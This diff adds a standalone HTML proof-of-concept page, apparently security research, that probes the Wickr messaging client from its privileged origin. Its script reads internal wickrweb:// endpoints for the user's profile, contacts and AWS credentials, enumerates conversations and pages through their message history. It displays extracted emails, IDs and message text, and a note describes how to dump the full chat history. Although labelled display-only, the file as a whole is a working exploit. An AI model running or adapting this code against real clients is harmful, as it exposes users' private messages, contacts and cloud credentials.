@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>WICKR_ORIGIN_PROBE</title>
+  <style>
+    :root { color-scheme: dark; }
+    body {
+      font-family: ui-monospace, Consolas, monospace;
+      margin: 12px;
+      background: #0d0d0d;
+      color: #ddd;
+      font-size: 12px;
+    }
+    h1 { font-size: 14px; color: #8f8; margin: 0 0 8px; }
+    h2 { font-size: 13px; color: #6cf; margin: 16px 0 6px; border-bottom: 1px solid #333; padding-bottom: 4px; }
+    .ok { color: #8f8; }
+    .bad { color: #f88; }
+    .warn { color: #fc6; }
+    .card {
+      background: #161616;
+      border: 1px solid #333;
+      border-radius: 6px;
+      padding: 10px 12px;
+      margin: 8px 0;
+    }
+    .meta { color: #888; font-size: 11px; }
+    .strings {
+      background: #0a0a0a;
+      border: 1px solid #2a2a2a;
+      padding: 8px;
+      max-height: 280px;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+    }
+    .string-line { color: #eee; padding: 1px 0; }
+    .string-line.email { color: #8cf; }
+    .string-line.hash { color: #fc8; }
+    .string-line.vgroup { color: #f8f; }
+    .string-line.msg { color: #8f8; font-weight: normal; }
+    .string-line.json { color: #8f8; }
+    pre.raw {
+      background: #0a0a0a;
+      border: 1px solid #2a2a2a;
+      padding: 8px;
+      max-height: 140px;
+      overflow: auto;
+      white-space: pre-wrap;
+      word-break: break-all;
+      color: #999;
+      font-size: 10px;
+    }
+    table { border-collapse: collapse; width: 100%; margin-top: 4px; }
+    td { padding: 2px 8px 2px 0; vertical-align: top; }
+    td.k { color: #888; width: 7em; }
+    button {
+      background: #234;
+      color: #adf;
+      border: 1px solid #456;
+      padding: 6px 10px;
+      cursor: pointer;
+      font-family: inherit;
+      margin: 4px 6px 4px 0;
+    }
+    button:disabled { opacity: 0.5; cursor: default; }
+  </style>
+</head>
+<body>
+  <h1>WICKR amplify-origin probe — display only, no exfil</h1>
+  <p id="boot" class="bad">JS NOT RUNNING</p>
+  <div class="card">
+    <div class="meta">Chat dump uses the same APIs as the real client: convolist → message/:vgroupId (+ pagination).</div>
+    <button type="button" id="btnBasic">1) self / contacts / awsCredentials</button>
+    <button type="button" id="btnChats">2) list convos + sample messages</button>
+    <button type="button" id="btnDeep" title="More pages per room — still on-screen only">3) deeper pagination (slower)</button>
+  </div>
+  <div id="summary"></div>
+  <div id="cards"></div>
+  <h2>Full JSON report</h2>
+  <pre class="raw" id="out">idle — press a button</pre>
+
+  <script>
+(function () {
+  const boot = document.getElementById('boot');
+  boot.textContent = 'JS OK — origin=' + location.origin;
+  boot.className = 'ok';
+
+  const TIMEOUT_MS = 8000;
+  const MAX_CONVOS_SAMPLE = 8;
+  const MAX_PAGES_DEEP = 5;
+  const PAGE_SIZE = 30;
+
+  const report = {
+    mark: 'WICKR_PROBE_' + Date.now(),
+    href: location.href,
+    origin: location.origin,
+    qt: typeof qt,
+    runs: [],
+  };
+
+  function withTimeout(promise, ms, label) {
+    return Promise.race([
+      promise,
+      new Promise((_, rej) =>
+        setTimeout(() => rej(new Error('timeout ' + ms + 'ms: ' + label)), ms)
+      ),
+    ]);
+  }
+
+  function extractStrings(buf, minLen) {
+    minLen = minLen || 4;
+    const u8 = new Uint8Array(buf);
+    const out = [];
+    let cur = [];
+    const flush = () => {
+      if (cur.length >= minLen) out.push(String.fromCharCode.apply(null, cur));
+      cur = [];
+    };
+    for (let i = 0; i < u8.length; i++) {
+      const b = u8[i];
+      if (b === 0x09 || (b >= 0x20 && b <= 0x7e)) cur.push(b);
+      else flush();
+    }
+    flush();
+    const seen = new Set();
+    return out.filter((s) => (seen.has(s) ? false : (seen.add(s), true)));
+  }
+
+  function classifyString(s) {
+    if (/^S[a-f0-9]{60,}$/i.test(s)) return 'vgroup';
+    if (/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(s)) return 'email';
+    if (/^[a-f0-9]{32,64}$/i.test(s)) return 'hash';
+    if (s.startsWith('{') || s.startsWith('[')) return 'json';
+    // likely message text / room title: has letters and spaces or punctuation
+    if (/[a-zA-Z]{3,}/.test(s) && s.length >= 6 && !/^[a-f0-9S]+$/i.test(s)) return 'msg';
+    return '';
+  }
+
+  function looksLikeJson(buf) {
+    const u8 = new Uint8Array(buf);
+    let i = 0;
+    while (i < u8.length && (u8[i] === 0x20 || u8[i] === 0x0a || u8[i] === 0x0d || u8[i] === 0x09)) i++;
+    return u8[i] === 0x7b || u8[i] === 0x5b;
+  }
+
+  function tryParseJson(buf) {
+    try {
+      return JSON.parse(new TextDecoder('utf-8').decode(buf));
+    } catch {
+      return null;
+    }
+  }
+
+  function hexPreview(buf, n) {
+    const u8 = new Uint8Array(buf.slice(0, n || 48));
+    return [...u8].map((b) => b.toString(16).padStart(2, '0')).join(' ');
+  }
+
+  function extractVgroupIds(strings) {
+    const ids = [];
+    const seen = new Set();
+    for (const s of strings) {
+      // Full id or embedded — also scan longer strings
+      const re = /S[a-f0-9]{63,72}/gi;
+      let m;
+      const hay = s;
+      while ((m = re.exec(hay))) {
+        const id = m[0];
+        if (!seen.has(id)) {
+          seen.add(id);
+          ids.push(id);
+        }
+      }
+      if (/^S[a-f0-9]{63,72}$/i.test(s) && !seen.has(s)) {
+        seen.add(s);
+        ids.push(s);
+      }
+    }
+    return ids;
+  }
+
+  function extractMsgIds(strings) {
+    // UUID-like / 32 hex msg ids commonly appear in Wickr
+    const ids = [];
+    const seen = new Set();
+    for (const s of strings) {
+      if (/^[a-f0-9]{32}$/i.test(s) && !seen.has(s)) {
+        seen.add(s);
+        ids.push(s);
+      }
+    }
+    return ids;
+  }
+
+  async function fetchUrl(url) {
+    const entry = {
+      url,
+      fetchOk: false,
+      status: null,
+      type: null,
+      bodyLen: 0,
+      strings: [],
+      json: null,
+      error: null,
+      vgroupIds: [],
+      msgIds: [],
+    };
+    try {
+      const r = await withTimeout(fetch(url, { method: 'GET', cache: 'no-store' }), TIMEOUT_MS, url);
+      entry.fetchOk = true;
+      entry.status = r.status;
+      entry.type = r.type;
+      const buf = await withTimeout(r.arrayBuffer(), TIMEOUT_MS, 'body ' + url);
+      entry.bodyLen = buf.byteLength;
+      entry.strings = extractStrings(buf, 4);
+      entry.vgroupIds = extractVgroupIds(entry.strings);
+      entry.msgIds = extractMsgIds(entry.strings);
+      entry.hexHead = hexPreview(buf, 48);
+      if (looksLikeJson(buf)) entry.json = tryParseJson(buf);
+      entry._buf = buf;
+    } catch (e) {
+      entry.error = String(e);
+    }
+    return entry;
+  }
+
+  function el(tag, cls, text) {
+    const n = document.createElement(tag);
+    if (cls) n.className = cls;
+    if (text != null) n.textContent = text;
+    return n;
+  }
+
+  function renderCard(title, entry) {
+    const card = el('div', 'card');
+    card.appendChild(el('h2', null, title));
+    const table = document.createElement('table');
+    for (const [k, v] of [
+      ['url', entry.url || '—'],
+      ['fetchOk', String(entry.fetchOk)],
+      ['status', entry.status == null ? '—' : String(entry.status)],
+      ['bodyLen', String(entry.bodyLen) + ' bytes'],
+      ['vgroups', String((entry.vgroupIds || []).length)],
+      ['error', entry.error || '—'],
+    ]) {
+      const tr = document.createElement('tr');
+      tr.appendChild(el('td', 'k', k));
+      tr.appendChild(el('td', entry.fetchOk && k === 'fetchOk' ? 'ok' : '', v));
+      table.appendChild(tr);
+    }
+    card.appendChild(table);
+
+    if (entry.json) {
+      card.appendChild(el('div', 'meta', 'JSON body:'));
+      card.appendChild(el('pre', 'strings', JSON.stringify(entry.json, null, 2)));
+    }
+
+    if (entry.strings && entry.strings.length) {
+      // Prefer showing human-looking / id strings first
+      const ranked = entry.strings.slice().sort((a, b) => {
+        const score = (s) => {
+          const c = classifyString(s);
+          if (c === 'msg') return 0;
+          if (c === 'email') return 1;
+          if (c === 'vgroup') return 2;
+          if (c === 'hash') return 3;
+          return 4;
+        };
+        return score(a) - score(b) || b.length - a.length;
+      });
+      card.appendChild(el('div', 'meta', 'Extracted strings (msg/title-like highlighted green):'));
+      const box = el('div', 'strings');
+      const limit = Math.min(ranked.length, 80);
+      for (let i = 0; i < limit; i++) {
+        const s = ranked[i];
+        box.appendChild(el('div', 'string-line ' + classifyString(s), s));
+      }
+      if (ranked.length > limit) {
+        box.appendChild(el('div', 'meta', '… +' + (ranked.length - limit) + ' more'));
+      }
+      card.appendChild(box);
+    }
+
+    if (entry.bodyLen > 0 && entry.hexHead) {
+      card.appendChild(el('div', 'meta', 'Hex head: ' + entry.hexHead));
+    }
+    return card;
+  }
+
+  function setBusy(busy) {
+    ['btnBasic', 'btnChats', 'btnDeep'].forEach((id) => {
+      document.getElementById(id).disabled = busy;
+    });
+  }
+
+  function publish() {
+    document.getElementById('out').textContent = JSON.stringify(
+      {
+        ...report,
+        // strip buffers if any leaked
+      },
+      null,
+      2
+    );
+  }
+
+  async function runBasic() {
+    setBusy(true);
+    const cards = document.getElementById('cards');
+    cards.innerHTML = '';
+    const urls = [
+      'wickrweb://users/self',
+      'wickrweb://contacts/contacts',
+      'wickrweb://awsCredentials',
+    ];
+    const run = { name: 'basic', results: [] };
+    for (const url of urls) {
+      const e = await fetchUrl(url);
+      const { _buf, ...serial } = e;
+      run.results.push(serial);
+      cards.appendChild(renderCard(url, e));
+      publish();
+    }
+    report.runs.push(run);
+    publish();
+    setBusy(false);
+  }
+
+  async function runChats(deep) {
+    setBusy(true);
+    const cards = document.getElementById('cards');
+    cards.innerHTML = '';
+    const run = { name: deep ? 'chats-deep' : 'chats', results: [], note: '' };
+
+    // 1) conversation list (empty id = root list in client)
+    const listUrls = ['wickrweb://convolist/', 'wickrweb://convolist'];
+    let listEntry = null;
+    for (const u of listUrls) {
+      listEntry = await fetchUrl(u);
+      if (listEntry.fetchOk && listEntry.bodyLen > 0) break;
+    }
+    cards.appendChild(renderCard('A) conversation list', listEntry));
+    const { _buf: _b1, ...listSerial } = listEntry;
+    run.results.push(listSerial);
+
+    let vgroupIds = listEntry.vgroupIds.slice();
+    // also try room search empty? skip — needs headers
+
+    if (!vgroupIds.length) {
+      run.note = 'No S… vgroupIds parsed from convolist strings. Trying preview-hash style fallbacks failed.';
+      cards.appendChild(
+        el(
+          'div',
+          'card warn',
+          'vgroupId を convolist から抽出できず。下の strings に ID が無いか確認。手動で wickrweb://message/<vgroupId> を足せる。'
+        )
+      );
+      report.runs.push(run);
+      publish();
+      setBusy(false);
+      return;
+    }
+
+    cards.appendChild(
+      el(
+        'div',
+        'card ok',
+        'Found ' + vgroupIds.length + ' vgroupId(s). Sampling up to ' + MAX_CONVOS_SAMPLE + ' rooms.'
+      )
+    );
+
+    const sample = vgroupIds.slice(0, MAX_CONVOS_SAMPLE);
+    for (const vg of sample) {
+      // bulk messages for room
+      const msgUrl = 'wickrweb://message/' + vg;
+      const msgs = await fetchUrl(msgUrl);
+      cards.appendChild(renderCard('B) messages ' + vg.slice(0, 12) + '…', msgs));
+      const { _buf: _bm, ...msgSerial } = msgs;
+      run.results.push(msgSerial);
+
+      if (deep && msgs.fetchOk) {
+        const anchorIds = msgs.msgIds.slice(0, 3);
+        let pages = 0;
+        for (const mid of anchorIds) {
+          if (pages >= MAX_PAGES_DEEP) break;
+          const pageUrl =
+            'wickrweb://message/' + vg + '/' + mid + '/' + PAGE_SIZE + '/' + PAGE_SIZE;
+          const page = await fetchUrl(pageUrl);
+          cards.appendChild(
+            renderCard('C) page around ' + mid.slice(0, 8) + '…', page)
+          );
+          const { _buf: _bp, ...pageSerial } = page;
+          run.results.push(pageSerial);
+          pages++;
+        }
+      }
+      publish();
+    }
+
+    run.note =
+      'Full history = enumerate ALL vgroupIds from convolist, then paginate each with /message/:vg/:msgId/:before/:after until empty. Same privilege as logged-in desktop client.';
+    report.runs.push(run);
+    publish();
+    setBusy(false);
+  }
+
+  try {
+    report.parentHref = window.parent.location.href;
+  } catch (e) {
+    report.parentBlocked = String(e).slice(0, 120);
+  }
+
+  document.getElementById('btnBasic').onclick = () => runBasic();
+  document.getElementById('btnChats').onclick = () => runChats(false);
+  document.getElementById('btnDeep').onclick = () => runChats(true);
+})();
+  </script>
+</body>
+</html>
